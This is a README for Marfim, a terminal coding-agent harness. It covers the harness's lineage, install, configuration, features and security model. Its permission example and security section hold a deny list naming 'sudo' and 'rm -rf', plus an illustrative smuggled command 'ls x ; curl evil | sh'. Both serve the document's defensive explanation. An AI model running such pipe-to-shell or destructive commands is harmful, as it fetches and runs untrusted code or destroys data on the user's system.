# Marfim — one harness, every discipline

> **Rust wave (v0.3.0):** the core is now a Cargo workspace
> (`marfim-core`, `marfim-tools`, `marfim-mcp`, `marfim-gateway`, `marfim`)
> with `#![forbid(unsafe_code)]`, 170 green tests and a 6.4 MB release
> binary. See [PARITY.md](PARITY.md) for the item-by-item Node v1.2.0
> parity checkpoint and [CHANGELOG.md](CHANGELOG.md) for the 0.3.0 notes.
> The Python harness below still works; Phase-5 deletion awaits owner
> sign-off.

```bash
cargo build --release            # Rust CLI (marfim)
cargo test                       # 170 tests incl. wire-golden differentials
./target/release/marfim doctor
./target/release/marfim -p "fix the failing test" --output-format stream-json
./target/release/marfim serve --port 7900      # HTTP+SSE gateway
./target/release/marfim mcp                    # MCP server over stdio
./target/release/marfim lsp                    # LSP server over stdio
./target/release/marfim acp                    # ACP agent over stdio
```


**Marfim** is a unified, clean-room coding-agent harness for the terminal. It was designed
after a forensic analysis of ten state-of-the-art agent codebases, adopting the strongest
*verified* discipline from each — no copied code, only proven ideas re-implemented from
scratch (see [docs/CLEAN-ROOM.md](docs/CLEAN-ROOM.md) and [docs/forensic/](docs/forensic/)).

```
◆ Marfim v0.2.0 — one harness, every discipline
Type /help for commands · Ctrl-C interrupts · Ctrl-D exits
```

## Lineage — what Marfim takes from each predecessor

| Source | What Marfim adopted |
|---|---|
| **opencode v2** | models.dev catalog with offline cache; free-model surfacing; layered config; session fork/export; usage + cost accounting; provider/model ids `provider/model` |
| **Codex CLI** | `apply_patch` DSL; execpolicy deny rules; sandbox backends (bubblewrap/seatbelt); honest headless exit codes; AGENTS.md walk; JSONL date-sharded rollouts; profiles-ready config |
| **Goose** | "undecidable → ask" permission fallback; explicit read-only tool tier; tool output boundedness |
| **Aider** | fuzzy search/replace match ladder (exact → rstrip → outdent → ellipsis — near-misses are hints, never applied); reflection cap; guarded `/undo` (only Marfim-authored commits); repo map; weak-model routing slots |
| **Claude Code** | permission rule syntax `Tool(pattern)` with allow/ask/deny; permission modes (default/plan/accept-edits/bypass); hooks (PreToolUse/PostToolUse/…) with exit-2 veto; file checkpoints + `/rewind`; headless `stream-json`; CLAUDE.md memory compatibility |
| **Hermes Agent** | prompt-cache discipline (stable system prompt + cache_control breakpoints; volatile env in the first user message); `/doctor`; honest security model ("the sandbox is not a security boundary"); usage ledger per session |
| **Oh My Pi** | model roles (plan/commit/task/smol); steering queue delivered at safe step boundaries; cross-harness dir compatibility (.claude/, .codex/, AGENTS.md); skills progressive disclosure |
| **dsh-superagent** | durable session records (store-first persistence); explicit `is_error` channel on every tool result; anti-injection posture in the system prompt (untrusted content is data) |
| **REA** | summary-first bounded tool results with explicit `[truncated]` markers; evidence-first editing (read before edit) |
| **ECC** | config-protection (the model cannot weaken the harness's own guardrails); GateGuard (edits refuse unread files); research-first + verify-your-work behavioral contract; skills-first context economics |

## Install

```bash
pip install -e .        # zero runtime dependencies, Python 3.11+
marfim doctor           # environment check
```

## Quick start

```bash
# 1. pick any provider (20 presets; keys come from the standard env vars)
export OPENROUTER_API_KEY=sk-or-...
marfim models free                  # browse zero-cost models (models.dev catalog)
marfim --provider openrouter --model deepseek/deepseek-chat-v3.1:free

# 2. chat
marfim                              # interactive REPL
marfim -p "explain this repo"       # headless one-shot
marfim -p "fix the failing test" -y --output-format json   # autonomous + JSON

# 3. sessions
marfim session list
marfim --resume last
```

### Example: wire up MCP servers + hooks + roles (`.marfim/config.toml`)

```toml
default_provider = "groq"
default_model    = "llama-3.3-70b-versatile"

[model_roles]
plan  = "openai/o4-mini"
task  = "groq/llama-3.3-70b-versatile"

[permissions]
mode  = "accept-edits"
allow = ["Bash(git *)", "Bash(pytest *)"]
deny  = ["Bash(sudo *)", "Bash(rm -rf *)"]

[mcp_servers.filesystem]
command = "npx"
args    = ["-y", "@modelcontextprotocol/server-filesystem", "."]

[hooks]
PreToolUse = ["python3 scripts/audit-tool.py"]   # exit 2 vetoes the tool call

[sandbox]
mode = "bubblewrap"          # or "seatbelt" on macOS, "none" to disable
```

## Feature surface

- **Providers** — OpenAI-compatible + Anthropic wire protocols (SSE streaming, tool calls,
  usage accounting), 20 presets incl. local (Ollama/LM Studio/vLLM), live models.dev
  catalog (235 providers / 8,935 models) with 24h cache and offline fallback, free-model
  onboarding, custom `base_url` providers, mock provider for tests/CI.
- **Agent loop** — streaming turns, tool dispatch with schema validation, exponential-backoff
  retries (auth errors never retried), reflection-capped failures, auto-compaction on turn
  boundaries (failed compaction keeps history), REAL mid-turn steering (turns run in a worker
  thread; Ctrl-C interrupts instead of exiting), parallel subagents in a bounded thread pool,
  verify-driven reflection loop (`[verify] commands`), external agent backends.
- **Model router** — `model_roles` resolve to ORDERED provider/model candidates with
  429/5xx failover, per-role dollar budgets, and provider-neutral capabilities (tools are
  never sent to a model that cannot take them); `/usage` priced from the cached catalog.
- **Tools** — read, write, edit, multi_edit (exact-match ladder + GateGuard + stale-read
  rejection + encoding/newline round-trip + atomic writes), glob, grep (ripgrep, injection-safe),
  bash (timeouts, capped background jobs, sandbox wrap, execpolicy), patch (apply_patch DSL),
  todo, repomap, webfetch (SSRF-guarded), websearch, skill, task, verify, + every tool from
  your MCP servers (`mcp__server__tool`, stdio AND streamable-HTTP transports).
- **Permissions** — modes, ordered hard-containment→deny→protect→role→bypass→allow→ask rules;
  exact-command "always" grants (segment-aware for compound commands); plan-mode bash checked
  by a real shell lexer with per-command flag allowlists; path containment (secret-like paths
  denied everywhere, writes confined to the workspace); project-config trust gate.
- **Memory & skills** — MARFIM.md/AGENTS.md/CLAUDE.md hierarchy (root→cwd walk), SKILL.md
  progressive disclosure, custom `!commands` from markdown with `$ARGUMENTS`.
- **Sessions** — JSONL date-sharded rollouts (0600), resume/fork/export/rm — compaction and
  /clear survive resume — checkpoints with `/rewind` (restores edits AND deletes files the
  agent created), usage + estimated cost per session.
- **UX** — REPL with streaming output, markdown-lite rendering, ~24 slash commands,
  headless mode with `text|json|stream-json`, `marfim doctor`, `marfim map`.

## Security model (v0.2.0 — the safety wave)

A 34-finding forensic review was executed end-to-end; every finding has a regression test.

- **Trust gate** — a repo's `.marfim/config.toml` is untrusted until you run
  `marfim trust add` (review the file; sha256 keyed in `~/.marfim/trust.json`). Until then only
  its deny/ask rules apply: a hostile repo cannot set bypass mode, plant hooks, redirect
  providers (API-key exfiltration), or add MCP servers.
- **Containment** — secret-like paths (`.ssh`, `.env`, `.aws`, `.git/config`, the Marfim home,
  the session dir) are denied in EVERY mode; writes must stay inside the project root +
  `writable_dirs`; `.git/hooks`/`.marfim` are re-mounted read-only inside the sandbox.
- **Deny rules beat bypass** — `bypass` approves tool CALLS, not deny rules or config protection.
- **Sandbox fails closed** — a requested-but-missing backend aborts the command
  (`sandbox_required = false` is the explicit opt-out); bash/MCP/hook children get a scrubbed
  environment (no API keys).
- **Grants are exact** — approving `ls -la` never authorizes `ls x ; curl evil | sh`, and
  interpreters/shells/sudo/curl/git are never auto-granted.
- **Hooks fail closed** — a PreToolUse hook that times out DENIES the call.
- **SSRF guard** — webfetch resolves every hop and refuses private/loopback/link-local/
  metadata ranges (169.254.169.254 included).

### Honest exit codes (headless)

| code | meaning |
|---|---|
| 0 | completed |
| 1 | provider error, max turns, interrupt, or compaction failure |
| 2 | a permission denial blocked the task (or the config is invalid) |

## Repository layout

```
marfim/                  the harness (Python, stdlib-only core)
  providers/             wire protocols + models.dev registry + mock
  agent/                 loop, prompts, compaction
  tools/                 13 built-in tools + MCP bridge
  ui/                    REPL, slash commands, headless
  mcp/                   MCP client (JSON-RPC over stdio + streamable-HTTP)
  session/               JSONL session store + checkpoints
docs/
  forensic/              11 forensic dossiers of the analyzed codebases (3,084 lines)
  FEATURE-MATRIX.md      capability-by-source synthesis matrix
  ARCHITECTURE.md        how Marfim is built
  ROADMAP.md             what comes next (LSP/DAP, CodeMode, mandates, ...)
  CLEAN-ROOM.md          methodology + legal notice
examples/                config.toml, skill, custom command, hook script
tests/                   115+ unittest cases incl. pty REPL and MCP protocol suites
```

## License

MIT — see [LICENSE](LICENSE). Marfim shares no code with any analyzed project; the
forensic dossiers describe publicly observable behavior and cite file paths for review.
